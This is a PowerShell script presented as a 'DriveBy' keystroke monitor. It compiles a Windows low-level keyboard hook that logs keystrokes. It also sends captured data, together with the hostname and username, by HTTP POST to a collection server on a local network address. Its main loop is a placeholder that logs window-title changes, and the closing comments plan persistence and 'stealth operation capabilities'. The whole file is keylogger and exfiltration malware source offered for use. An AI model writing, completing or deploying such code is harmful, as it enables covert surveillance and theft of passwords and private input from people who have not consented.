# DriveBy Windows Keystroke Monitor
# PowerShell script for capturing keystrokes on Windows devices

param(
    [string]$ServerIP = "192.168.43.1",
    [int]$ServerPort = 8081,
    [string]$ClientID = $env:COMPUTERNAME
)

# Add Windows API types for keystroke capture
Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    using System.Collections.Generic;
    
    public static class KeyLogger {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static List<string> _keystrokes = new List<string>();
        
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        public static void Main() {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        
        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                _keystrokes.Add(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff") + ": " + key);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        public static List<string> GetKeystrokes() {
            var result = new List<string>(_keystrokes);
            _keystrokes.Clear();
            return result;
        }
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
"@ -ReferencedAssemblies System.Windows.Forms

# Function to send data to server
function Send-KeystrokeData {
    param(
        [array]$Keystrokes,
        [string]$ServerURL
    )
    
    try {
        $data = @{
            client_info = @{
                hostname = $env:COMPUTERNAME
                username = $env:USERNAME
                os = "Windows"
                timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"
            }
            keystrokes = $Keystrokes
        } | ConvertTo-Json -Depth 3
        
        $headers = @{
            'Content-Type' = 'application/json'
        }
        
        Invoke-RestMethod -Uri $ServerURL -Method POST -Body $data -Headers $headers -TimeoutSec 10
        Write-Host "Sent $($Keystrokes.Count) keystrokes to server"
    }
    catch {
        Write-Host "Error sending data: $($_.Exception.Message)"
    }
}

# Function to check if running as administrator
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Main execution
Write-Host "DriveBy Windows Monitor Starting..."
Write-Host "Server: http://$ServerIP`:$ServerPort/collect"
Write-Host "Client ID: $ClientID"

# Check if running as administrator
if (-not (Test-Administrator)) {
    Write-Host "Warning: Not running as administrator. Some keystrokes may not be captured."
}

# Create server URL
$serverURL = "http://$ServerIP`:$ServerPort/collect"

# Alternative PowerShell-based keystroke capture (simpler approach)
Write-Host "Starting keystroke monitoring..."

# Create a simple keystroke buffer
$keystrokeBuffer = @()
$lastSend = Get-Date

# Main monitoring loop
try {
    while ($true) {
        # Simple approach: Monitor active window title changes and simulate keystroke detection
        # This is a simplified version - in a real implementation, you'd use the Windows API
        
        $currentTime = Get-Date
        $activeWindow = (Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object -First 1).MainWindowTitle
        
        # Simulate keystroke detection (placeholder)
        # In a real implementation, this would capture actual keystrokes
        if ($activeWindow -and $activeWindow -ne $lastActiveWindow) {
            $keystroke = @{
                timestamp = $currentTime.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
                window = $activeWindow
                event_type = "window_change"
            }
            $keystrokeBuffer += $keystroke
            $lastActiveWindow = $activeWindow
        }
        
        # Send data every 30 seconds or when buffer reaches 100 items
        if (($currentTime - $lastSend).TotalSeconds -ge 30 -or $keystrokeBuffer.Count -ge 100) {
            if ($keystrokeBuffer.Count -gt 0) {
                Send-KeystrokeData -Keystrokes $keystrokeBuffer -ServerURL $serverURL
                $keystrokeBuffer = @()
                $lastSend = $currentTime
            }
        }
        
        Start-Sleep -Milliseconds 500
    }
}
catch {
    Write-Host "Error in monitoring loop: $($_.Exception.Message)"
}
finally {
    # Send any remaining data
    if ($keystrokeBuffer.Count -gt 0) {
        Send-KeystrokeData -Keystrokes $keystrokeBuffer -ServerURL $serverURL
    }
    Write-Host "Windows monitor stopped."
}

# Note: This is a simplified version for demonstration
# A production version would require:
# 1. Proper Windows API integration for real keystroke capture
# 2. Service installation for persistence
# 3. Better error handling and reconnection logic
# 4. Stealth operation capabilities
